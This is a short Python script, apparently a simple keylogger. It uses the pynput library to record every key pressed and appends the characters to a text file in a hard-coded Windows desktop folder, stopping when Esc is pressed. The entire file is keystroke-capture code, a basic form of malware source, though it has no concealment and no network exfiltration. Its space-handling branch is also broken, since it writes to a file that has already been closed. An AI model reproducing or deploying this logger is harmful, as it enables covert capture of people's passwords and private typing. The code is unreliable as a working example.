from pynput.keyboard import Key,Listener
import os
os.chdir(r'C:\Users\RUK\Desktop')
def on_press(key):
    try:
        with open('ex.txt','a') as f:
            f.write(key.char)
    except AttributeError:
        if(key==Key.space):
                f.write(' ')
        elif(key==Key.ctrl_l):
            with open('ex.txt','a') as f:
                f.write('ctrl-')
        else:
            pass
def on_release(key):
    if key ==Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

